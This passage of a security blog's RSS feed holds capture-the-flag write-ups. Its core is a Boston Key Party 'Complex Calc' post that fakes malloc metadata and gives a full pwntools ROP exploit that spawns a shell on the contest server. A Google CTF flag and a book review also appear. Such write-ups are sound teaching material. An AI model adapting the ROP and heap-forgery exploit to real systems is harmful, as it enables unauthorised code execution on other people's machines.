+&lt;p&gt;Once IDA has connected to the application (just skipping past the auto-set bps), and the app is running, I use &lt;code&gt;am&lt;/code&gt; again to send one of the intents, then tap on the button that shows up. IDA should break immediately. Now at this point we see that the output of &lt;code&gt;perhapsThis&lt;/code&gt;, which is fed directly to &lt;code&gt;putExtra&lt;/code&gt; is stored in &lt;code&gt;v6&lt;/code&gt;. Opening the &amp;lsquo;Watch&amp;rsquo; view (Debugger -&amp;gt; Debugger windows -&amp;gt; Watch view), I simply created a new watch on &lt;code&gt;v6&lt;/code&gt; that casts it to &lt;code&gt;Object *&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-05-02-Google-CTF-Mobile-150-Ill-Intentions-flag.png&#34; alt=&#34;Flag&#34;&gt;&lt;/p&gt;
+&lt;p&gt;(Yes, I got lucky and chose the correct activity on my first try).&lt;/p&gt;
+&lt;p&gt;flag: CTF{IDontHaveABadjokeSorry}&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-05-02-google-ctf-mobile-150-ill-intentions/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>My Reading Summary - February-March 2016</title>
+        <link>https://grazfather.github.io/posts/2016-04-01-reading-february-march-2016/</link>
+        <pubDate>Fri, 01 Apr 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-04-01-reading-february-march-2016/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-04-01-reading-february-march-2016/ -&lt;p&gt;&lt;strong&gt;Mastery&lt;/strong&gt;: Robert Greene (Author of &amp;ldquo;48 Laws of Power&amp;rdquo;) uses examples of historical &amp;lsquo;masters&amp;rsquo; of their domain, such as Mozart, and well as more contemporary masters, such at Paul Graham. Apparently a lot of practice will make you good at something. Really though, I enjoyed this book a lot. Each chapter begins with a story from one of the masters, which focuses on a specific task that the author deems important in the quest for mastery, he then breaks down how the master succeeded in this and how it paid off, and then ends with a more direct summary of how you should apply it to your life. I found many of the stories inspiring and motivating, and while most of the tasks involved seemed obvious, I like how he gave weight to them with concrete examples.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Life-Changing Magic of Tidying Up&lt;/strong&gt;: It is a little embarrassing that I read this book, but I had been wanting to go through my old stuff, and this is a short read. Her method basically involves going through all your stuff at once and throwing away anything you don&amp;rsquo;t really like or don&amp;rsquo;t need (&amp;ldquo;Throw away anything that doesn&amp;rsquo;t spark joy&amp;rdquo;). She spends a lot of time trying to convince you that you should throw away &lt;em&gt;most&lt;/em&gt; things, and uses many examples from her clients. You definitely cannot read this book too literally (unless you want to start talking to your clothes), but I think the ideas are sound: We have a lot of things we don&amp;rsquo;t need, and they get in the way more than they help us. I read this book in only a few days and the following weekend tossed out years of stuff I had been lugging around every time I moved. This included bus passes from 2000!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Small Things Considered: Why There Is No Perfect Design&lt;/strong&gt;: This is one of the most boring books I have ever read. The author stresses that everything we do is design, and that all design involves trade-offs. He takes us on a thrilling ride where he describes things such as: Drinking water, ordering dinner, buying a car. While some of the stories were interesting (e.g. the design of paper bag folding machines), they are bogged down by the very repetitive and boring explanations of the trade offs made in the designs. Much could be gained by cutting about half of the book&amp;rsquo;s pages. I feel I should have just given up on this book.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Thinking Fast and Slow&lt;/strong&gt;: This is probably my favourite book I have read this year so far. I like to consider myself a rational person, but this book explains with many examples and studies that show just how easily we make the non-rational choice. Each chapter is only about 10 pages, which makes it very digestible, and yet I found myself amazed at the end of almost each one. The book is broken into five parts explaining how we &amp;lsquo;should&amp;rsquo; act, and comparing it to how we do. The first, for example, splits our brain into &amp;lsquo;system 1&amp;rsquo; and &amp;lsquo;system 2&amp;rsquo;, where system 1 is intuitive, fast, and automatic, while system 2 is rational and deliberate. System 2 can figure out how to act rationally, but it&amp;rsquo;s lazy and would rather have system 1 answer, or is even succeptible to influence from system 1. A whole collection of cognitive biases and heuristics we use are explained with examples, the studies to back them, and their implication. Because these biases are innate it&amp;rsquo;s hard to avoid them, but I hope that just being aware of them would help me realize when I am falling victim to them.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Zero to One&lt;/strong&gt; (Audiobook): Very thought provoking, as it has made me reconsider what ideas are worth pursuing and what startups in the area may be &amp;lsquo;the next facebook&amp;rsquo;. Although I don&amp;rsquo;t agree 100% (There are plenty of billion-dollar companies that made their money going from &amp;ldquo;One to N&amp;rdquo;, Peter Thiel does a good job convincing me of the value of doing something novel, especially when he talks about the value of forming a monopoly (and then underplaying it). The basic idea is that these juggernaut companies are where they are because they have monopolies in their respective markets and defend them vigorously, while downplaying the idea that they have a monopoly at all. This is done, for example, by Google, by extending into other fields, such as video streaming, while maintaining a stranglehold on advertizing. Overall a quick read (or listen) and worth a second look.&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-04-01-reading-february-march-2016/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Boston Key Party - PWN 5 ‘Complex Calc’</title>
+        <link>https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-complex-calc/</link>
+        <pubDate>Sun, 06 Mar 2016 00:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-complex-calc/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-complex-calc/ -&lt;p&gt;Taking a quick look at this binary, we see it&amp;rsquo;s almost idenfical to the &amp;lsquo;Simple Calc&amp;rsquo;. Testing my ROP chain on it, however, crashes in &lt;code&gt;free&lt;/code&gt;: It looks like &lt;code&gt;free(0)&lt;/code&gt; won&amp;rsquo;t fly anymore.&lt;/p&gt;
+&lt;p&gt;To confirm that my ROP was still valid, I set a breakpoint on the call to &lt;code&gt;free&lt;/code&gt; and manually wrote the pointer to the original buffer into RDI. With this, my ROP indeed did work and I could focus on passing the &lt;code&gt;free&lt;/code&gt; call.&lt;/p&gt;
+&lt;p&gt;Peeking into the implementation of &lt;code&gt;free&lt;/code&gt;, we see that a few NOPs were added to prevent us from providing 0 as the pointer. Looking a bit further, we see &lt;code&gt;[rdi-8]&lt;/code&gt; and &lt;code&gt;[rdi-10h]&lt;/code&gt; are referenced. That means that the metadata for the structure exists just &lt;em&gt;before&lt;/em&gt; the block.&lt;/p&gt;
+&lt;p&gt;Breaking on the &lt;code&gt;malloc&lt;/code&gt; call, and inspecting the memory around, we see that 16 bytes before the returned pointer seems to be always null, while -8 is some odd number. Playing around with the number of calculations requested we see that this number grows with size: It&amp;rsquo;s the size of the block, plus the size of the metadata, then aligned to some multiple of 16.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;0x000000000040143f in main &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
+gdb-peda$ x/4gx $rax - 0x10
+0x6c8bc0:       0x0000000000000000      0x0000000000000021
+0x6c8bd0:       0x0000000000000000      0x0000000000000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I got lucky in that I already know about how free works to not have to figure out why the size value is odd: The low bit represents whether or not the allocation is in use. When &lt;code&gt;free&lt;/code&gt; is called, the bit is set to 0, but also the next block is checked. If that block is also not in use, then the two blocks are coalesced. This is to try to prevent memory fragmentation.&lt;/p&gt;
+&lt;p&gt;The next block can easily be found by adding the size to the current allocation:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdb-peda$ x/4gx $rax - 0x10 + 0x20
+0x6c8be0:       0x0000000000000000      0x0000000000020421
+0x6c8bf0:       0x0000000000000000      0x0000000000000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If we want the &lt;code&gt;free&lt;/code&gt; call to pass, then we are going to need to pass it a pointer memory that has what looks like a valid malloc block 16 bytes before it. On top of that, we need the &lt;em&gt;next&lt;/em&gt; block (determined by adding the &lt;em&gt;size&lt;/em&gt; to the pointer) has a &lt;em&gt;size&lt;/em&gt; value that is odd, to prevent coalescing.&lt;/p&gt;
+&lt;p&gt;Luckily for us, we can do just that: In our last ROP we only needed a few of the global vars (&lt;code&gt;sub&lt;/code&gt; and &lt;code&gt;divv&lt;/code&gt;), leaving us &lt;code&gt;add&lt;/code&gt; and &lt;code&gt;mul&lt;/code&gt; to fill with allocation metadata. Testing with a valid allocation, I confirmed that garbage data at -0x10 doesn&amp;rsquo;t seem to affect the freeing, making our job easier.&lt;/p&gt;
+&lt;p&gt;Since the ROP is the same, we should only need a few changes:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Instead of writing NULL on the stack, we need to be careful to overwrite the buf pointer with a pointer to our fake allocation.&lt;/li&gt;
+&lt;li&gt;We need to write two blocks of junk metadata. The first must have a size that is the correct distance away from the second and have the low bit set. The second must only have the low bit set.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I spent &lt;em&gt;way&lt;/em&gt; too much time trying to make these metadata blocks contiguous (16 bytes apart), but eventually realized that the minimum distance is the minimum alloc (1) plus the size of the metadata (16) rounded up. Lucky for us, &lt;code&gt;add&lt;/code&gt; and &lt;code&gt;mul&lt;/code&gt; are indeed that distance apart.&lt;/p&gt;
+&lt;p&gt;I populated the first block by providing two numbers to the app opration whose sum is 0x21. This required a negative number, since there was an unsigned check to ensure the operant is greater than 39.&lt;/p&gt;
+&lt;p&gt;The second number was easier: I just needed to populate it with any odd number, and the result of 41*41 fit the bill.&lt;/p&gt;
+&lt;p&gt;What&amp;rsquo;s important to note is that I don&amp;rsquo;t provide &lt;code&gt;free&lt;/code&gt; a pointer to the metadata, but 16 bytes beyond that, which is &lt;code&gt;divv&lt;/code&gt;, where I had placed the string &amp;ldquo;/bin/sh\0&amp;rdquo;. This, I would find out, is very important&amp;hellip;&lt;/p&gt;
+&lt;p&gt;Excitedly running the new exploit and&amp;hellip; crash. Wtf? Breaking into it with a debugger and following through the ROP, I saw that my string had been wiped out. Stepping through main, I realized that because I was freeing &lt;code&gt;divv&lt;/code&gt;, it was getting zeroed out.&lt;/p&gt;
+&lt;p&gt;Now the issue I had with &amp;lsquo;Simple Calc&amp;rsquo; ended up helping me out: Because I had had to find and use a write mem gadget to get rid of &lt;code&gt;_dl_tls_static_used&lt;/code&gt;, I was prepared for this: Instead of writing to the global &lt;code&gt;divv&lt;/code&gt; using calculation caching, I would instead write it &lt;em&gt;after&lt;/em&gt; the free as extra ROPs.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;write_addr&lt;/span&gt;(addr):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ADD &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(addr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; NULL
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Commands&lt;/span&gt;
+ADD &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+SUB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+MUL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+DIV &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+DONE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+NULL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SUB&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Gadgets&lt;/span&gt;
+POP_RDI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00401b73&lt;/span&gt;)
+POP_RAX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0044db34&lt;/span&gt;)
+POP_RDX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00437a85&lt;/span&gt;)
+POP_RSI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00401c87&lt;/span&gt;)
+MOV_EDX_TO_AT_RAX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0044526f&lt;/span&gt;)
+SYSCALL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x004648e5&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# Globals&lt;/span&gt;
+addX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C4A80&lt;/span&gt;
+addY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+addRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+divX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+divY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+divRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+mulX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+mulY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+mulRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+subX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+subY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+subRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+_dl_tls_static_used &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C4AC0&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Build commands&lt;/span&gt;
+commands &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;100&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# Any large number&lt;/span&gt;
+    write_addr(addX&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# Fill stack with address of divX. This will wipe it out :(&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Set _dl_tls_static_used to 0&lt;/span&gt;
+    POP_RAX,
+    write_addr(_dl_tls_static_used),
+    POP_RDX,
+    NULL, NULL,
+    MOV_EDX_TO_AT_RAX,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Put &amp;#34;/bin/sh&amp;#34; at divX using ROP&lt;/span&gt;
+    POP_RAX,
+    write_addr(divX),
+    POP_RDX,
+    write_addr(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]),
+    MOV_EDX_TO_AT_RAX,
+    POP_RAX,
+    write_addr(divY),
+    POP_RDX,
+    write_addr(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]),
+    MOV_EDX_TO_AT_RAX,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now get ready for syscall&lt;/span&gt;
+    POP_RDI,
+    write_addr(divX),  &lt;span style=&#34;color:#75715e&#34;&gt;# divX holds the string &amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
+    POP_RAX,
+    SUB &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4096&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; NULL,  &lt;span style=&#34;color:#75715e&#34;&gt;# 0x3b = execve&lt;/span&gt;
+    POP_RDX,
+    NULL, NULL,  &lt;span style=&#34;color:#75715e&#34;&gt;# RDX should be null&lt;/span&gt;
+    POP_RSI,  &lt;span style=&#34;color:#75715e&#34;&gt;# RSI should point to an array that has a pointer to &amp;#34;/bin/sh&amp;#34; and a null pointer&lt;/span&gt;
+    write_addr(subY),
+    SYSCALL,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now we need to populate the global vars by running extra calcs&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# -- Put pointer to divX at subY with null after&lt;/span&gt;
+    SUB &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(divX) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(divX) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now we need to put two malloc blocks in add and mul&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# The first 8 bytes (x and y) don&amp;#39;t matter, it&amp;#39;s the result that does&lt;/span&gt;
+    ADD &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-123&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;156&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# sum is 0x21&lt;/span&gt;
+    MUL &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;41&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;41&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# product is odd&lt;/span&gt;
+    DONE
+]
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simplecalc.bostonkey.party&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5500&lt;/span&gt;)
+garbage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(commands))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+- https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-complex-calc/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Boston Key Party - PWN 5 ‘Simple Calc’</title>
+        <link>https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-simple-calc/</link>
+        <pubDate>Sun, 06 Mar 2016 00:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-simple-calc/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-simple-calc/ -&lt;p&gt;Running strings we see this is a x86_64 binary &lt;em&gt;statically compiled&lt;/em&gt;, which should make things a lot easier for us.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vagrant@kali:/vagrant/ctfs/bostonkp2016$ file simplecalc
+simplecalc: ELF 64-bit LSB executable, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GNU/Linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, statically linked, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 2.6.24, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;0x0676a83cc38d2b9b20c612f4d7a19255eaa93b52, not stripped&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Running the application, with IDA open on the side to quickly get past any restriction, I see that this program simply takes some number of calculations and then for each it allows you to choose wish operation to perform and the two operands. Both operands must be greater than 39, and the input and result are 4 byte ints. There are 12 global variables, three for each operation, and one for each operand and the result, plus four bytes padding between each set to maintain alignment.&lt;/p&gt;
